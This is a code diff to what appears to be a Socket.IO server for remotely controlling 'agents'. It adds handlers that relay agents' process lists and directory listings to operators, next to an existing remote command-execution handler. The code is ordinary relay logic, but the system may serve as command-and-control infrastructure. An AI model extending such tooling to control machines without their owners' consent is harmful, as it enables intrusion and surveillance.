@@ -2709,6 +2709,21 @@ def handle_execute_command(data):
     else:
         emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)
 
+@socketio.on('process_list')
+def handle_process_list(data):
+    """Agent sends structured process list; relay to operators."""
+    agent_id = data.get('agent_id')
+    processes = data.get('processes', [])
+    emit('process_list', {'agent_id': agent_id, 'processes': processes}, room='operators', broadcast=True)
+
+@socketio.on('file_list')
+def handle_file_list(data):
+    """Agent sends structured directory listing; relay to operators."""
+    agent_id = data.get('agent_id')
+    path = data.get('path', '/')
+    files = data.get('files', [])
+    emit('file_list', {'agent_id': agent_id, 'path': path, 'files': files}, room='operators', broadcast=True)
+
 @socketio.on('command_output')
 def handle_command_output(data):
     """Agent sends back the result of a command (legacy handler)."""
